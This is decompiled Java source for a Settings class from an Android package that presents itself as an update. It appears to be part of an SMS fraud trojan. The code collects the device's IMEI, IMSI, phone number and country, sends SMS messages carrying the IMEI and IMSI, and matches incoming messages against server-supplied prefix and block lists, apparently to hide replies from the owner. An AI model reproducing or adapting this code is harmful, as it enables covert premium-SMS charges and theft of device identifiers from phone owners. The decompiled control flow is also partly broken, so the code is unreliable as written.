package androidupdate.l.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.io.PrintStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
{
  public static String SETTINGS = "settings";
  public static boolean ok = false;
  public static String phone = "phone";
  static Settings settings;
  public static String text = "text";
  public static boolean userAgree = false;
  public static boolean userCancel = false;
  public Vector<Operator> operators = new Vector();
  
  public Settings() {}
  
  public static String getCountry(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSimCountryIso();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getCurrentTime()
  {
    Time localTime = new Time();
    localTime.setToNow();
    return localTime.format("%Y_%m_%d_%H_%M_%S");
  }
  
  public static String getImei(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getImsi(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getPhone(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static Settings getSettings()
  {
    return settings;
  }
  
  public static boolean isAosMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONObject("aos");
      if (paramString2.getBoolean("enable"))
      {
        paramString2 = paramString2.getJSONArray("phones");
        int i = 0;
        while (i < paramString2.length())
        {
          boolean bool = paramString1.startsWith(paramString2.getString(i));
          if (bool) {
            return true;
          }
          i += 1;
        }
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isDeleteMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONArray("blockPhones");
      int i = 0;
      while (i < paramString2.length())
      {
        boolean bool = paramString1.equals(paramString2.getString(i));
        if (bool) {
          return true;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isOkMessage(String paramString1, String paramString2)
  {
    WildCardStringFinder localWildCardStringFinder1 = new WildCardStringFinder();
    WildCardStringFinder localWildCardStringFinder2 = new WildCardStringFinder();
    return (phone.length() > 0) && (text.length() > 0) && (localWildCardStringFinder2.isStringMatching(paramString1, phone)) && (localWildCardStringFinder1.isStringMatching(paramString2, text));
  }
  
  public static String md5(String paramString)
  {
    try
    {
      Object localObject = MessageDigest.getInstance("MD5");
      ((MessageDigest)localObject).update(paramString.getBytes());
      paramString = ((MessageDigest)localObject).digest();
      localObject = new StringBuffer();
      int i = 0;
      for (;;)
      {
        if (i >= paramString.length) {
          return ((StringBuffer)localObject).toString();
        }
        String str = Integer.toHexString(paramString[i] & 0xFF);
        if (str.length() == 1) {
          ((StringBuffer)localObject).append("0");
        }
        ((StringBuffer)localObject).append(str);
        i += 1;
      }
      return "";
    }
    catch (NoSuchAlgorithmException paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static boolean sendSms(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = paramString2.replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi);
      System.out.println("sms: " + paramString2 + " to " + paramString1);
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static void setSettings(Settings paramSettings)
  {
    settings = paramSettings;
  }
  
  public boolean load(Context paramContext)
  {
    bool2 = false;
    System.out.println("Settings::load() start");
    for (;;)
    {
      try
      {
        Constants.imei = getImei(paramContext);
        Constants.imsi = getImsi(paramContext);
        Constants.phone = getPhone(paramContext);
        Constants.country = getCountry(paramContext);
        paramContext = paramContext.getSharedPreferences(SETTINGS, 1);
        bool1 = bool2;
        if (paramContext.contains("first"))
        {
          userAgree = paramContext.getBoolean("userAgree", false);
          userCancel = paramContext.getBoolean("userCancel", false);
          paramContext = new JSONArray(paramContext.getString("operators", ""));
          this.operators = new Vector();
          i = 0;
          int j = paramContext.length();
          if (i < j) {
            continue;
          }
          bool1 = true;
        }
      }
      catch (Exception paramContext)
      {
        int i;
        JSONObject localJSONObject;
        Operator localOperator;
        paramContext.printStackTrace();
        boolean bool1 = bool2;
        continue;
      }
      System.out.println("Settings::load() end");
      return bool1;
      localJSONObject = paramContext.getJSONObject(i);
      localOperator = new Operator();
      localOperator.name = localJSONObject.getString("name");
      localOperator.time = localJSONObject.getLong("time");
      i += 1;
    }
  }
  
  public void printToOutStream() {}
  
  public void reset(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.clear();
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean save(Context paramContext)
  {
    System.out.println("Settings::save() start");
    for (;;)
    {
      try
      {
        paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
        paramContext.putBoolean("first", false);
        paramContext.putBoolean("userAgree", userAgree);
        paramContext.putBoolean("userCancel", userCancel);
        localJSONArray = new JSONArray();
        i = 0;
        if (i < this.operators.size()) {
          continue;
        }
        paramContext.putString("operators", localJSONArray.toString());
        paramContext.commit();
      }
      catch (Exception paramContext)
      {
        JSONArray localJSONArray;
        int i;
        Operator localOperator;
        JSONObject localJSONObject;
        paramContext.printStackTrace();
        continue;
      }
      System.out.println("Settings::save() end");
      return false;
      localOperator = (Operator)this.operators.get(i);
      localJSONObject = new JSONObject();
      localJSONObject.put("name", localOperator.name);
      localJSONObject.put("time", localOperator.time);
      localJSONArray.put(localJSONObject);
      i += 1;
    }
  }
}
